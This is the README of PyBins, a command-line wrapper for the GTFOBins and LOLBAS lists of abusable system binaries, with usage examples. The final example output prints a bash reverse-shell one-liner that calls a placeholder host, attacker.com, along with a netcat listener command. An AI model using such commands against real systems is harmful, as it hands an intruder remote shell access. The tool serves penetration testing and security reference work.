# PyBins

PyBins is a command line utily that wraps the content of [GTFOBins](https://gtfobins.github.io/) and [LOLBAS](https://lolbas-project.github.io/)

## Instalation:
`
pip install pybins
`
## Usage:

```
usage: pybins [-h] [-p PLATFORM] [-b BINARY] [-f FUNCTION]

PyBins Cmd Line wraper for GTFOBin and LOLBas

optional arguments:
  -h, --help            show this help message and exit
  -p PLATFORM, --platform PLATFORM
                        Select the platform to lookup, Win/Windows or
                        Lin/Linux, case insensitive
  -b BINARY, --binary BINARY
                        The binary to lookup
  -f FUNCTION, --function FUNCTION
                        The function to lookup
```

## Examples

### List platform available binaries and functions/categories:

* `pybins -p win`
* `pybins -p windows`
* `pybins -p lin`
* `pybins -p linux`

### List all linux binaries with reverse-shell function:

* `pybins -p lin -f reverse-shell`
* `pybins -p linux -f reverse-shell`

#### Output

```
The Function reverse-shell has the following binaries:

nc           perl     ksh    rview               cpan     node          telnet        irb
python       gdb      pip    bash                view     openssl       gimp          rvim
socat        vim      php    jrunscript          jjs      ruby          vimdiff       easy_install
```

### List all functions of the Linus binary bash

* `pybins -p lin -b bash`
* `pybins -p linux -b bash`

#### Output

```
The binary bash has the following categories:

shell    reverse-shell      file-upload     file-download      file-write     file-read    library-load
suid     sudo
```

### List all the commands for the binary bash and function reverse-shell on linux

* `pybins -p lin -b bash -f reverse-shell`
* `pybins -p linux -b bash -f reverse-shell`

#### Output

```
Description:  Run `nc -l -p 12345` on the attacker box to receive the shell.
Command:      export RHOST=attacker.com
              export RPORT=12345
              bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
```
